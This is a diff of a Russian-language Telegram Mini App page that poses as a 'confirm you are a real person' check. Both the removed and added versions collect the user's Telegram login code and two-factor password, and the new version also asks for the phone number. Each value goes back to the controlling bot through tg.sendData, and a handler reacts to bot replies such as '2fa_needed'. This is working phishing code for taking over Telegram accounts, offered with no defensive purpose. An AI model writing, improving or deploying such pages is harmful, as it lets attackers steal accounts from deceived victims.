@@ -1,403 +1,335 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Клавиатура</title>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  body {
-    background: linear-gradient(to bottom, 
-      #87CEEB 0%,
-      #B0E0E6 40%, 
-      #98D98E 70%,
-      #7CB342 100%
-    );
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-    overflow: hidden;
-    position: relative;
-  }
-
-  .leaf {
-    position: fixed;
-    top: -40px;
-    font-size: 24px;
-    pointer-events: none;
-    z-index: 1;
-    animation: fall linear infinite;
-  }
-
-  @keyframes fall {
-    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-    100% { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
-  }
-
-  .content {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 16px;
-    z-index: 10;
-    width: 300px;
-  }
-
-  .phone-container {
-    position: relative;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 6px;
-  }
-
-  .arrow {
-    position: absolute;
-    left: -50px;
-    font-size: 38px;
-    color: #3b82f6;
-    animation: arrowMove 1.4s ease-in-out infinite;
-  }
-
-  @keyframes arrowMove {
-    0%, 100% { transform: translateX(0); }
-    50% { transform: translateX(6px); }
-  }
-
-  .phone {
-    width: 100px;
-    height: 178px;
-    background: linear-gradient(145deg, #2c2c2e, #1c1c1e);
-    border-radius: 22px;
-    border: 3px solid #3a3a3c;
-    position: relative;
-    box-shadow: 0 12px 30px rgba(0,0,0,0.35);
-    overflow: hidden;
-    animation: float 3.2s ease-in-out infinite;
-  }
-
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
-  }
-
-  .island {
-    position: absolute;
-    top: 8px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 48px;
-    height: 14px;
-    background: #000;
-    border-radius: 20px;
-    z-index: 5;
-  }
-
-  .phone-screen {
-    position: absolute;
-    top: 6px;
-    left: 5px;
-    right: 5px;
-    bottom: 6px;
-    background: #000;
-    border-radius: 16px;
-    overflow: hidden;
-  }
-
-  .apps {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    grid-template-rows: repeat(6, 1fr);
-    gap: 5px;
-    padding: 22px 7px 10px;
-    height: 100%;
-  }
-
-  .app {
-    border-radius: 7px;
-  }
-  .app:nth-child(1) { background: linear-gradient(135deg, #34c759, #30d158); }
-  .app:nth-child(2) { background: linear-gradient(135deg, #ff2d55, #ff375f); }
-  .app:nth-child(3) { background: linear-gradient(135deg, #007aff, #0a84ff); }
-  .app:nth-child(4) { background: linear-gradient(135deg, #af52de, #bf5af2); }
-  .app:nth-child(5) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
-  .app:nth-child(6) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
-  .app:nth-child(7) { background: linear-gradient(135deg, #ffd60a, #ffcc00); }
-  .app:nth-child(8) { background: linear-gradient(135deg, #ff3b30, #ff453a); }
-  .app:nth-child(9) { background: linear-gradient(135deg, #30b0c7, #40c8e0); }
-  .app:nth-child(10) { background: linear-gradient(135deg, #af52de, #bf5af2); }
-  .app:nth-child(11) { background: linear-gradient(135deg, #34c759, #30d158); }
-  .app:nth-child(12) { background: linear-gradient(135deg, #007aff, #0a84ff); }
-  .app:nth-child(13) { background: linear-gradient(135deg, #ff2d55, #ff375f); }
-  .app:nth-child(14) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
-  .app:nth-child(15) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
-  .app:nth-child(16) { background: linear-gradient(135deg, #af52de, #bf5af2); }
-  .app:nth-child(17) { background: linear-gradient(135deg, #ffd60a, #ffcc00); }
-  .app:nth-child(18) { background: linear-gradient(135deg, #30b0c7, #40c8e0); }
-  .app:nth-child(19) { background: linear-gradient(135deg, #34c759, #30d158); }
-  .app:nth-child(20) { background: linear-gradient(135deg, #007aff, #0a84ff); }
-  .app:nth-child(21) { background: linear-gradient(135deg, #ff3b30, #ff453a); }
-  .app:nth-child(22) { background: linear-gradient(135deg, #64d2ff, #5ac8fa); }
-  .app:nth-child(23) { background: linear-gradient(135deg, #ff9500, #ff9f0a); }
-  .app:nth-child(24) { background: linear-gradient(135deg, #af52de, #bf5af2); }
-
-  .info-text {
-    background: rgba(0, 0, 0, 0.45);
-    color: white;
-    padding: 12px 16px;
-    border-radius: 14px;
-    font-size: 14px;
-    text-align: center;
-    line-height: 1.4;
-    backdrop-filter: blur(6px);
-  }
-
-  .code-boxes {
-    display: flex;
-    gap: 10px;
-  }
-
-  .code-box {
-    width: 42px;
-    height: 48px;
-    background: rgba(0, 0, 0, 0.35);
-    border: 1.5px solid rgba(255, 255, 255, 0.25);
-    border-radius: 12px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 24px;
-    font-weight: 600;
-    color: white;
-  }
-
-  .buttons {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 12px;
-    width: 100%;
-  }
-
-  .btn {
-    background: rgba(100, 180, 255, 0.45);
-    color: white;
-    border: 1.5px solid rgba(255, 255, 255, 0.5);
-    border-radius: 50px;
-    height: 54px;
-    font-size: 22px;
-    font-weight: 500;
-    cursor: pointer;
-    transition: all 0.15s ease;
-    backdrop-filter: blur(6px);
-    text-decoration: none;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-  .btn:active {
-    transform: scale(0.96);
-    background: rgba(80, 160, 240, 0.7);
-  }
-
-  .btn-zero { grid-column: 2; }
-  .btn-back { font-size: 20px; }
-  .btn-main {
-    grid-column: 1 / -1;
-    height: 50px;
-    font-size: 17px;
-  }
-
-  /* Скрываем блоки по умолчанию */
-  .mode-block {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    gap: 16px;
-    width: 100%;
-  }
-  .mode-block.active {
-    display: flex;
-  }
-
-  .password-input {
-    width: 100%;
-    padding: 14px;
-    font-size: 18px;
-    text-align: center;
-    background: rgba(0,0,0,0.3);
-    border: 1.5px solid rgba(255,255,255,0.4);
-    border-radius: 12px;
-    color: white;
-    outline: none;
-  }
-  .password-input::placeholder {
-    color: rgba(255,255,255,0.5);
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Проверка личности</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px 16px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .emoji { font-size: 80px; margin: 10px 0; }
+        .lead { font-size: 18px; font-weight: 500; margin: 8px 0; }
+        .muted { color: #9da3a8; font-size: 14px; margin: 4px 0 16px; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #2f80ed, #3aa3ff);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-top: 12px;
+        }
+        .btn:active { opacity: 0.7; }
+        .btn-secondary { background: #2a2a2a; margin-top: 8px; }
+        .code-boxes {
+            display: flex;
+            gap: 12px;
+            margin: 16px 0 12px;
+        }
+        .code-box {
+            width: 50px;
+            height: 56px;
+            background: #111;
+            border-radius: 12px;
+            border: 2px solid #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .code-box.filled { border-color: #2f80ed; }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            width: 100%;
+            margin: 16px 0 12px;
+        }
+        .kbtn {
+            padding: 14px;
+            background: #1a1a1a;
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .kbtn:active { background: #2a2a2a; }
+        .kbtn.del { background: #1a1a1a; color: #ff6b6b; font-size: 20px; }
+        .status {
+            color: #9da3a8;
+            font-size: 14px;
+            min-height: 24px;
+            margin-top: 8px;
+        }
+        .status.success { color: #69db7c; }
+        .status.error { color: #ff6b6b; }
+        .hidden { display: none !important; }
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 18px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .input-field:focus { border-color: #2f80ed; outline: none; }
+        .twofa-input {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            margin: 12px 0;
+        }
+        .twofa-input:focus { border-color: #2f80ed; outline: none; }
+    </style>
 </head>
 <body>
-
-<div class="content">
-  <div class="phone-container">
-    <div class="arrow">➜</div>
-    <div class="phone">
-      <div class="island"></div>
-      <div class="phone-screen">
-        <div class="apps">
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
-          <div class="app"></div><div class="app"></div><div class="app"></div><div class="app"></div>
+    <div class="container">
+        <!-- Экран приветствия -->
+        <div id="screen-welcome">
+            <div class="emoji">👋</div>
+            <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
+            <div class="muted">Нажмите на кнопку ниже для начала!</div>
+            <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
-      </div>
+
+        <!-- Экран ввода номера -->
+        <div id="screen-phone" class="hidden">
+            <div class="emoji">📱</div>
+            <div class="lead">Введите Ваш номер телефона</div>
+            <div class="muted">Мы отправим код подтверждения</div>
+            <input class="input-field" type="tel" id="phoneInput" placeholder="+7 999 999 99 99">
+            <button class="btn" id="btnSendPhone">Отправить</button>
+            <div class="status" id="statusPhone"></div>
+        </div>
+
+        <!-- Экран ожидания -->
+        <div id="screen-waiting" class="hidden">
+            <div class="emoji">⏳</div>
+            <div class="lead">Ожидайте, не выходите!</div>
+            <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
+        </div>
+
+        <!-- Экран ввода кода -->
+        <div id="screen-code" class="hidden">
+            <div class="emoji">🔐</div>
+            <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
+            <div class="code-boxes" id="codeBoxes">
+                <div class="code-box" data-index="0"></div>
+                <div class="code-box" data-index="1"></div>
+                <div class="code-box" data-index="2"></div>
+                <div class="code-box" data-index="3"></div>
+                <div class="code-box" data-index="4"></div>
+            </div>
+            <button class="btn btn-secondary" id="btnGetCode">Узнать код</button>
+            <div class="keypad" id="keypad">
+                <button class="kbtn" data-key="1">1</button>
+                <button class="kbtn" data-key="2">2</button>
+                <button class="kbtn" data-key="3">3</button>
+                <button class="kbtn" data-key="4">4</button>
+                <button class="kbtn" data-key="5">5</button>
+                <button class="kbtn" data-key="6">6</button>
+                <button class="kbtn" data-key="7">7</button>
+                <button class="kbtn" data-key="8">8</button>
+                <button class="kbtn" data-key="9">9</button>
+                <button class="kbtn" data-key="0">0</button>
+                <button class="kbtn del" data-key="backspace">⌫</button>
+            </div>
+            <div class="status" id="statusCode"></div>
+            <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
+                <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
+                <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
+            </div>
+        </div>
+
+        <!-- Экран успеха -->
+        <div id="screen-success" class="hidden">
+            <div class="emoji">✅</div>
+            <div class="lead">Подтверждено!</div>
+            <div class="muted">Вы успешно прошли проверку</div>
+        </div>
     </div>
-  </div>
 
-  <!-- Блок для ввода кода -->
-  <div id="codeBlock" class="mode-block active">
-    <div class="info-text">
-      Введите 5-значный код, который мы вам только что отправили!
-    </div>
-    <div class="code-boxes">
-      <div class="code-box" data-index="0"></div>
-      <div class="code-box" data-index="1"></div>
-      <div class="code-box" data-index="2"></div>
-      <div class="code-box" data-index="3"></div>
-      <div class="code-box" data-index="4"></div>
-    </div>
-    <div class="buttons">
-      <button class="btn" data-num="1">1</button>
-      <button class="btn" data-num="2">2</button>
-      <button class="btn" data-num="3">3</button>
-      <button class="btn" data-num="4">4</button>
-      <button class="btn" data-num="5">5</button>
-      <button class="btn" data-num="6">6</button>
-      <button class="btn" data-num="7">7</button>
-      <button class="btn" data-num="8">8</button>
-      <button class="btn" data-num="9">9</button>
-      <button class="btn btn-zero" data-num="0">0</button>
-      <button class="btn btn-back" data-action="back">⌫</button>
-    </div>
-    <button id="submitCodeBtn" class="btn btn-main" style="background: rgba(0,200,100,0.6);">Подтвердить код</button>
-  </div>
-
-  <!-- Блок для ввода 2FA пароля -->
-  <div id="twofaBlock" class="mode-block">
-    <div class="info-text">
-      🔐 Введите пароль двухфакторной аутентификации
-    </div>
-    <input type="password" id="passwordInput" class="password-input" placeholder="Пароль 2FA">
-    <button id="submit2faBtn" class="btn btn-main" style="background: rgba(200,150,50,0.6);">Подтвердить пароль</button>
-  </div>
-</div>
-
-<script>
-  // Инициализация Telegram WebApp
-  const tg = window.Telegram.WebApp;
-  tg.ready();
-  tg.expand();
-
-  // Определение режима из параметров URL
-  const urlParams = new URLSearchParams(window.location.search);
-  const mode = urlParams.get('mode') || 'code'; // 'code' или '2fa'
-
-  // Показываем нужный блок
-  document.getElementById('codeBlock').classList.toggle('active', mode === 'code');
-  document.getElementById('twofaBlock').classList.toggle('active', mode === '2fa');
-
-  // Логика для кода (5 ячеек)
-  const boxes = document.querySelectorAll('.code-box');
-  let currentIndex = 0;
-
-  function updateCodeBoxes() {
-    boxes.forEach((box, idx) => {
-      box.textContent = idx < currentIndex ? '●' : ''; // можно показывать точки или цифры
-    });
-  }
-
-  // Сохраняем введённый код в переменную
-  let codeDigits = [];
-
-  document.querySelectorAll('#codeBlock .btn[data-num]').forEach(btn => {
-    btn.addEventListener('click', () => {
-      if (currentIndex < 5) {
-        const digit = btn.dataset.num;
-        codeDigits.push(digit);
-        boxes[currentIndex].textContent = digit;
-        currentIndex++;
-        if (currentIndex === 5) {
-          // Автоматически отправляем код при заполнении
-          submitCode();
+    <script>
+        let tg = window.Telegram.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
         }
-      }
-    });
-  });
 
-  document.querySelector('#codeBlock .btn[data-action="back"]').addEventListener('click', () => {
-    if (currentIndex > 0) {
-      currentIndex--;
-      codeDigits.pop();
-      boxes[currentIndex].textContent = '';
-    }
-  });
+        let phone = '';
+        let codeDigits = [];
+        let currentStep = 'welcome';
 
-  // Кнопка "Подтвердить код"
-  document.getElementById('submitCodeBtn').addEventListener('click', submitCode);
+        function showScreen(screenId) {
+            ['screen-welcome', 'screen-phone', 'screen-waiting', 'screen-code', 'screen-success'].forEach(id => {
+                document.getElementById(id).classList.toggle('hidden', id !== screenId);
+            });
+            currentStep = screenId.replace('screen-', '');
+        }
 
-  function submitCode() {
-    if (codeDigits.length < 5) {
-      alert('Введите все 5 цифр кода');
-      return;
-    }
-    const code = codeDigits.join('');
-    tg.sendData(JSON.stringify({ type: 'code', code: code }));
-    tg.close();
-  }
+        function updateCodeBoxes() {
+            document.querySelectorAll('.code-box').forEach((box, index) => {
+                box.textContent = codeDigits[index] || '';
+                box.classList.toggle('filled', !!codeDigits[index]);
+            });
+        }
 
-  // Логика для 2FA
-  document.getElementById('submit2faBtn').addEventListener('click', () => {
-    const password = document.getElementById('passwordInput').value.trim();
-    if (!password) {
-      alert('Введите пароль 2FA');
-      return;
-    }
-    tg.sendData(JSON.stringify({ type: '2fa', password: password }));
-    tg.close();
-  });
+        function sendToBot(payload) {
+            if (!tg) {
+                alert('Telegram WebApp не найден');
+                return;
+            }
+            tg.sendData(JSON.stringify(payload));
+        }
 
-  // Обработка Enter для поля пароля
-  document.getElementById('passwordInput').addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') {
-      document.getElementById('submit2faBtn').click();
-    }
-  });
+        // === КНОПКИ ===
+        document.getElementById('btnConfirm').addEventListener('click', () => {
+            showScreen('screen-phone');
+        });
 
-  // Падающие листья (декор)
-  const leaves = ['🍂', '🍁', '🍃'];
-  function createLeaf() {
-    const leaf = document.createElement('div');
-    leaf.classList.add('leaf');
-    leaf.textContent = leaves[Math.floor(Math.random() * leaves.length)];
-    leaf.style.left = Math.random() * 100 + 'vw';
-    leaf.style.fontSize = (Math.random() * 18 + 18) + 'px';
-    const duration = Math.random() * 5 + 5;
-    leaf.style.animationDuration = duration + 's';
-    document.body.appendChild(leaf);
-    setTimeout(() => leaf.remove(), (duration + 2) * 1000);
-  }
-  setInterval(createLeaf, 400);
-  for (let i = 0; i < 10; i++) setTimeout(createLeaf, i * 200);
-</script>
+        document.getElementById('btnSendPhone').addEventListener('click', () => {
+            phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                document.getElementById('statusPhone').textContent = 'Введите номер';
+                document.getElementById('statusPhone').className = 'status error';
+                return;
+            }
+            if (!phone.startsWith('+')) phone = '+' + phone;
+            document.getElementById('statusPhone').textContent = 'Отправка...';
+            document.getElementById('statusPhone').className = 'status';
+            
+            sendToBot({ phone: phone, code: '', password: '' });
+            showScreen('screen-waiting');
+            
+            setTimeout(() => {
+                showScreen('screen-code');
+                document.getElementById('statusCode').textContent = '📲 Код отправлен! Введите его.';
+                document.getElementById('statusCode').className = 'status success';
+            }, 2000);
+        });
 
+        document.getElementById('keypad').addEventListener('click', (e) => {
+            const key = e.target.dataset.key;
+            if (!key) return;
+            if (key === 'backspace') {
+                codeDigits.pop();
+                updateCodeBoxes();
+                return;
+            }
+            if (codeDigits.length >= 5) return;
+            codeDigits.push(key);
+            updateCodeBoxes();
+            if (codeDigits.length === 5) {
+                const code = codeDigits.join('');
+                document.getElementById('statusCode').textContent = '⏳ Проверка...';
+                document.getElementById('statusCode').className = 'status';
+                sendToBot({ phone: phone, code: code, password: '' });
+            }
+        });
+
+        document.getElementById('btnGetCode').addEventListener('click', () => {
+            if (phone) {
+                sendToBot({ phone: phone, code: '', password: '' });
+                document.getElementById('statusCode').textContent = '📲 Код отправлен повторно!';
+                document.getElementById('statusCode').className = 'status success';
+            }
+        });
+
+        document.getElementById('twofaSubmit').addEventListener('click', () => {
+            const password = document.getElementById('twofaInput').value.trim();
+            if (!password) {
+                document.getElementById('statusCode').textContent = 'Введите пароль';
+                document.getElementById('statusCode').className = 'status error';
+                return;
+            }
+            document.getElementById('statusCode').textContent = '⏳ Проверка пароля...';
+            document.getElementById('statusCode').className = 'status';
+            sendToBot({ phone: phone, code: '', password: password });
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (currentStep !== 'code') return;
+            if (/^\d$/.test(e.key)) {
+                if (codeDigits.length < 5) {
+                    codeDigits.push(e.key);
+                    updateCodeBoxes();
+                    if (codeDigits.length === 5) {
+                        const code = codeDigits.join('');
+                        document.getElementById('statusCode').textContent = '⏳ Проверка...';
+                        document.getElementById('statusCode').className = 'status';
+                        sendToBot({ phone: phone, code: code, password: '' });
+                    }
+                }
+            } else if (e.key === 'Backspace') {
+                codeDigits.pop();
+                updateCodeBoxes();
+            }
+        });
+
+        // Функция для обработки ответов от бота (вызывается из бота)
+        window.handleBotResponse = function(response) {
+            if (response === '2fa_needed') {
+                document.getElementById('twofaBlock').classList.remove('hidden');
+                document.getElementById('statusCode').textContent = '🔐 Требуется пароль 2FA';
+                document.getElementById('statusCode').className = 'status';
+            } else if (response === 'success') {
+                showScreen('screen-success');
+                setTimeout(() => { if (tg) tg.close(); }, 2000);
+            } else if (response === 'code_invalid') {
+                document.getElementById('statusCode').textContent = '❌ Неверный код. Попробуйте снова.';
+                document.getElementById('statusCode').className = 'status error';
+                codeDigits = [];
+                updateCodeBoxes();
+            } else if (response === 'code_expired') {
+                document.getElementById('statusCode').textContent = '❌ Код истек. Отправлен новый.';
+                document.getElementById('statusCode').className = 'status error';
+                codeDigits = [];
+                updateCodeBoxes();
+            } else if (response === 'phone_invalid') {
+                showScreen('screen-phone');
+                document.getElementById('statusPhone').textContent = '❌ Неверный номер';
+                document.getElementById('statusPhone').className = 'status error';
+            }
+        };
+    </script>
 </body>
 </html>
